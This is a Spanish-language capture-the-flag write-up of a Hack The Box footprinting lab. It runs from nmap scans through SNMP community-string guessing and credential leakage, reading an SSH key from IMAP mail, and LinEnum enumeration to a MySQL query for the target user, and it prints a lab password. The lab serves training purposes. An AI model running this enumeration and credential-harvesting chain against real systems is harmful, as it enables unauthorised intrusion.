--- 
title: "Laboratorio de Footprinting - Díficil"  
date: 2025-04-30  
tags: ["HTB", "Footprinting","nmap", "snmp", "ssh", "mysql"]  
categories: ["HTB", "Footprinting"]  
summary: "En este laboratorio de **footprinting** de nivel difícil, analizamos un servidor MX expuesto en la red interna. Mediante técnicas de enumeración activa sobre servicios como **IMAPS**, **SNMP** y **MySQL**, descubrimos credenciales sensibles que nos permitieron acceder por **SSH** y capturar la flag mediante **MySQL**."
draft: false 

---
#### Enunciado
Este es un servidor MX y de administración para la red interna. Este servidor también funciona como servidor de respaldo para las cuentas internas del dominio.
Por lo tanto, también se creó aquí un usuario llamado `HTB`, y necesitamos sus credenciales.

#### Enumeración
Vamos con lo básico a ver qué servicios están corriendo sobre el servidor.
```bash
nmap -p- -sS --min-rate 2000 -n -Pn <IP>
```

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil1.png)

Ahora vamos a ver con un poco más de detalle que hay corriendo en cada puerto que nos salió a ver si vemos algo interesante.

```bash
nmap -22,110,143,993,995 -sCV -n -Pn <IP>
```

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil2.png)

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil3.png)

Luego de realizar scripts en `TCP` para recopilar más información sobre los servicios y veo que no pude avanzar mucho mas dado que tanto en pop como imap para poder listar correos necesito alguna credencial y por ssh no tengo claves tampoco, escaneamos por `UDP` para ver si encontramos algo.

```bash
nmap -sU --top-port 100 10.129.5.201
```

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil4.png)

Y vemos que tenemos 2 servicios más. Vamos a enumerarlos más en detalle:

```bash
nmap -sUCV -p68,161 10.129.5.201
```

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil5.png)

Vemos que en puerto 161 está usando snmp de versión 3. 
Recordemos que **SNMP** - Es un protocolo usado para supervisar y gestionar dispositivos de red.
Con la herramienta onesixtyone vemos si podemos obtener información 
```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil6.png)
Y obtenemos la cadena de comunidad backup que podemos usar con `snmpwalk` para obtener más información.

```bash
snmpwalk -v 2c -c backup <IP>
```

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil7.png)

Y vemos a continuación como unos intentos de cambiar la contraseña del usuario `tom`

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil8.png)

Vale a priori al menos tenemos un usuario, vamos a intentar acceder a imap o pop.

```bash
openssl s_client -connect <IP>:993 -crlf -quiet
```

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil9.png)
y efectivamente vemos que nos podemos acceder.
Listamos los buzones del correo del usuario y vemos varios. `a LIST "" * `

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil10.png)

Al ir entrando en cada uno vemos que en `INBOX` tenemos un correo. `a SELECT INBOX `
Abrimos el correo `a fetch 1 body[]` y vemos que es un correo del admin para tom donde le está pasando su clave ssh privada, la cual podemos copiar y usar para poder acceder al sistema como dicho usuario.

![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil11.png)

Ahora básicamente copiamos la clave en un archivo que creamos en local con nombre `id_rsa` lo pegamos y le otorgamos permisos 600
`chmod 600 id_rsa`

Ahora vamos a utilizar la clave para acceder: 
```bash
ssh -i id_rsa tom@<IP>
```

Vale ya dentro vamos a proceder  a pasar un script de reconocimiento de Linux donde nos va a mostrar información del equipo y con ella intentar escalar privilegios.

Primero nos descargamos el script LinEnum.sh a local con el comando 
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/refs/heads/master/LinEnum.sh
```

Luego en la carpeta donde nos descargamos el script montamos un servidor web para transferirlo a la máquina víctima.
```python
python3 -m http.server 8000
```

Ahora en la máquina víctima hacemos un curl al servidor web de la siguiente forma:
```bash
curl http://<IP>:8000/LinEnum.sh -o script.sh
```
Recordar la IP es la de la interfaz de Hack the Box.

Luego en la máquina víctima le damos permisos de ejecución al script
```bash
chmod +x script.sh
```

Y lo ejecutamos
```bash
./script.sh
```
Mostrando lo siguiente:
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil12.png)
Y vemos esto que tenemos con el usuario tom cierto privilegio con el servicio mysql.
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil13.png)
Vemos si está corriendo el servicio y sí está corriendo.
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil14.png)
Vemos donde está ubicado para llamarlo y ejecutarlo:
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil15.png)
Ejecutamos el comando:
```bash
#/usr/bin/mysql Este da error porque debemos especificar la contraseña.

/usr/bin/mysql -p #Ponemos a continuación el password del usuario tom 'NMds732Js2761'
```
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil16.png)Y podemos acceder a mysql
```mysql
show databases;
```
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil17.png)
Seleccionamos la base de datos users:
```mysql
use users;
```
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil18.png)
Vemos su contendido  y nos damos cuenta que hay muchos usuarios en dicha tabla:
```mysql
select * from users;
```
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil19.png)
Y con la siguiente query encontramos el usuario deseado
```mysql
select * from users where username = 'HTB';
```
![](../../../../../images/HTB_modulos/footprinting_htb_labs_3/díficil20.png)

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.